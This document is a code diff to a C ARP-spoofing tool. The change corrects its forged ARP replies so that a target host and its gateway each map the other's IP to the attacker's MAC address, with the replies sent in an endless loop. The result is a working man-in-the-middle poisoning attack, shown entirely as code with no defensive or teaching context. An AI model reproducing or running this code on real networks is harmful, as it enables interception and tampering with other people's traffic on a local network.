@@ -19,8 +19,8 @@ int initialize_inject(const char *gateway_ip, char *target_ip, char *own_ip, con
     uint32_t my_ip;
     uint8_t my_mac[6];
     char *interface = ifname;
-    uint32_t target_ip_one;
-    uint32_t target_ip_two;
+    uint32_t ip_gateway;
+    uint32_t ip_target;
     struct in_addr ip_addr = {0};
     printf("Initializing inject\n");
     
@@ -29,13 +29,13 @@ int initialize_inject(const char *gateway_ip, char *target_ip, char *own_ip, con
         perror("Error in inet_aton()");
         exit(1);
     }
-    target_ip_one = ip_addr.s_addr;
+    ip_target = ip_addr.s_addr;
     
     if (!inet_aton(gateway_ip, &ip_addr)) {
         perror("Error in inet_aton()");
         exit(1);
     }
-    target_ip_two = ip_addr.s_addr;
+    ip_gateway = ip_addr.s_addr;
     
     if (!inet_aton(own_ip, &ip_addr)) {
         perror("Error in inet_aton()");
@@ -50,30 +50,30 @@ int initialize_inject(const char *gateway_ip, char *target_ip, char *own_ip, con
     
     // Given the two IP addresses, find out the MAC addresses   
     struct arp_header arp_hdr; 
-    get_mac_addr(target_ip_one, my_ip, my_mac, interface, &arp_hdr);
+    get_mac_addr(ip_target, my_ip, my_mac, interface, &arp_hdr);
     
-    uint8_t mac_addr_one[MAC_LEN];
-    memcpy(mac_addr_one, arp_hdr.sha, MAC_LEN); 
+    uint8_t mac_target[MAC_LEN];
+    memcpy(mac_target, arp_hdr.sha, MAC_LEN); 
 
     printf("MAC address found for IP address %s -> %02x:%02x:%02x:%02x:%02x:%02x\n", target_ip, 
-            mac_addr_one[0], mac_addr_one[1], mac_addr_one[2], mac_addr_one[3],
-            mac_addr_one[4], mac_addr_one[5]);
+            mac_target[0], mac_target[1], mac_target[2], mac_target[3],
+            mac_target[4], mac_target[5]);
     
-    get_mac_addr(target_ip_two, my_ip, my_mac, interface, &arp_hdr);
+    get_mac_addr(ip_gateway, my_ip, my_mac, interface, &arp_hdr);
     
-    uint8_t mac_addr_two[MAC_LEN];
-    memcpy(mac_addr_two, arp_hdr.sha, MAC_LEN); 
+    uint8_t mac_gateway[MAC_LEN];
+    memcpy(mac_gateway, arp_hdr.sha, MAC_LEN); 
    
     printf("MAC address found for IP address %s -> %02x:%02x:%02x:%02x:%02x:%02x\n", gateway_ip,
-            mac_addr_two[0], mac_addr_two[1], mac_addr_two[2], mac_addr_two[3],
-            mac_addr_two[4], mac_addr_two[5]);
+            mac_gateway[0], mac_gateway[1], mac_gateway[2], mac_gateway[3],
+            mac_gateway[4], mac_gateway[5]);
     
 
     // Send spoofed packets
     printf("Starting spoofing\n");
     while (1) {
-        arp_spoof(mac_addr_one, my_mac, my_ip, target_ip_one, ifname);
-        arp_spoof(mac_addr_two, my_mac, my_ip, target_ip_one, ifname);
+        arp_spoof(mac_gateway, my_mac, ip_gateway, ip_target, ifname);
+        arp_spoof(mac_target, my_mac, ip_target, ip_gateway, ifname);
         sleep(2);
     }    
     return 0;
@@ -151,7 +151,7 @@ void get_mac_addr(uint32_t target_ip, uint32_t own_ip, uint8_t *own_mac, char *i
     close(sock);
 }
 
-void arp_spoof(uint8_t *target_mac, uint8_t *own_mac, uint32_t own_ip, uint32_t target_ip, char *ifname) {
+void arp_spoof(uint8_t *target_mac, uint8_t *own_mac, uint32_t target_ip_one, uint32_t target_ip_two, char *ifname) {
 
     int sock = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
     if (sock == -1) {
@@ -177,10 +177,11 @@ void arp_spoof(uint8_t *target_mac, uint8_t *own_mac, uint32_t own_ip, uint32_t 
     arp_hdr.protocol_size = IP_LEN;
     arp_hdr.opcode = htons(ARPOP_REPLY); 
     
+    // Target_ip_one thinks target_ip_two's MAC address is my MAC 
     memcpy(&arp_hdr.sha, own_mac, MAC_LEN);
-    memcpy(&arp_hdr.spa, &own_ip, IP_LEN);
+    memcpy(&arp_hdr.spa, &target_ip_two, IP_LEN);
     memcpy(&arp_hdr.tha, target_mac, MAC_LEN);
-    memcpy(&arp_hdr.tpa, &target_ip, IP_LEN);
+    memcpy(&arp_hdr.tpa, &target_ip_one, IP_LEN);
     
     if (sendto(sock, &arp_hdr, sizeof(struct arp_header), 0, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
         perror("sendto() failed");
